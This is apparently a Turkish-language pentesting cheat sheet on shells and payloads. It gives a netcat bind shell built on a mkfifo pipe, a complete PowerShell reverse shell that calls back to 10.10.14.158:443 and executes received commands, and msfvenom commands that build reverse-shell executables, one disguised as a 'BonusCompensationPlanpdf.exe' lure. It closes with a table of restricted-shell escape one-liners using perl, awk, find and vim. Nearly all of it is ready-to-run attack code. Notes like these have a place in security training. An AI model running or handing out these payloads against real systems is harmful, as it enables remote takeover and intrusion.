# SHELL AND PAYLOADS

+ [ ] [Detaylı Sheller İçin](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)
+ [ ] **.aspx** `antak.aspx` var

---

## msfconsole

> [!DANGER] BAZEN SHELL ÇALIŞMAZSA `show payloads` diyerek payloadı target sisteme göre değiştirmemiz gerekir

---


## bind shell

1. ## hedef sisteme girdikden sonra kendi makinamızda dinlemeye alırız

+ **ip adress targetin ip adresi**
+ **port targetin bize bağlanacağı port**

```bash
nc -nv 10.129.41.200 7777
```

2. ## hedef sistemden kendimize bağlanmak için 


```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

## Reverse Shells

### Reverse Shell in Windows

**start a listener with `nc`**

```bash
sudo nc -lvnp 443
```

**and run this payload target `windows`**

```bash
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```



## MSFvenom ile payload oluşturma

**Listeleme**
```bash
 msfvenom -l payloads
```

**Oluşturma**

+ `-f` format örn: exe,elf

### Linux

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=myip LPORT=myport -f elf > createbackup.elf
```

### Windows

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```



## 

Kısıtlı shell nedir?

Bazı sistemlerde kullanıcılar tam shell yerine sınırlı bir ortamda çalışır. Örneğin yalnızca belirli komutlara izin verilir, cd ya da / gibi yollara erişim kısıtlanır. Yönetici, bir kullanıcıya sadece belirli bir programı çalıştırma izni verdiğinde bu durum ortaya çıkar.


## Bu teknikler ne yapar?

Kısıtlı ortamda bir programın içinden (ör. Vim, AWK, Find) başka bir program çalıştırabiliyorsanız, o programın özelliklerini kullanarak /bin/sh shell’ini açabilirsiniz. Böylece kısıtlamaların dışına çıkmış olursunuz.

Örneğin:

Vim’in :shell komutu, kabuğu doğrudan açar.
Find’ın -exec seçeneği, belirttiğiniz komutu çalıştırır.
AWK’ın system() fonksiyonu, işletim sistemi komutu çalıştırır

### Kabuktan Shell Alma (Shell Escape)

| Yöntem | Komut | Açıklama |
|---|---|---|
| `/bin/sh -i` | `/bin/sh -i` | Yorumlayıcıyı etkileşimli modda başlatır. |
| Perl | `perl -e 'exec "/bin/sh";'` | Perl kuruluysa shell'i çalıştırır. Bir script içinde çalıştırılmalıdır. |
| Ruby | `ruby: exec "/bin/sh"` | Ruby kuruluysa shell'i çalıştırır. Bir script içinde çalıştırılmalıdır. |
| Lua | `lua: os.execute('/bin/sh')` | Lua kuruluysa `os.execute` ile shell'i çalıştırır. Bir script içinde çalıştırılmalıdır. |
| AWK | `awk 'BEGIN {system("/bin/sh")}'` | AWK ile shell'i çalıştırır. |
| Find | `find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;` | `find`, bulduğu her dosya için AWK üzerinden shell'i çalıştırır. |
| Find (exec) | `find . -exec /bin/sh \; -quit` | `-exec` ile doğrudan shell'i başlatır. Dosya bulunamazsa shell açılmaz. |
| Vim | `vim -c ':!/bin/sh'` | Vim'i açıp içinden shell komutu çalıştırır. |
| Vim (escape) | `vim` → `:set shell=/bin/sh` → `:shell` | Vim içinden shell'i ayarlayıp açar. |

**Notlar**

- Perl, Ruby ve Lua örneklerinde komutlar doğrudan terminale değil, bir script dosyasına yazılarak çalıştırılmalıdır.
- `/bin/sh -i` çıktısındaki `sh: no job control in this shell` uyarısı normaldir. Bu shell'de iş kontrolü (Ctrl+Z gibi) çalışmaz.
- Bu teknikler, sudo veya SUID ile izin verilmiş bir programın kısıtlı shell'den kaçmak için kullanılmasında önemlidir. Kısıtlı bir ortamda bu komutlardan biri çalışıyorsa, ortamın kaçış yollarını kapatmadığı anlamına gelir.
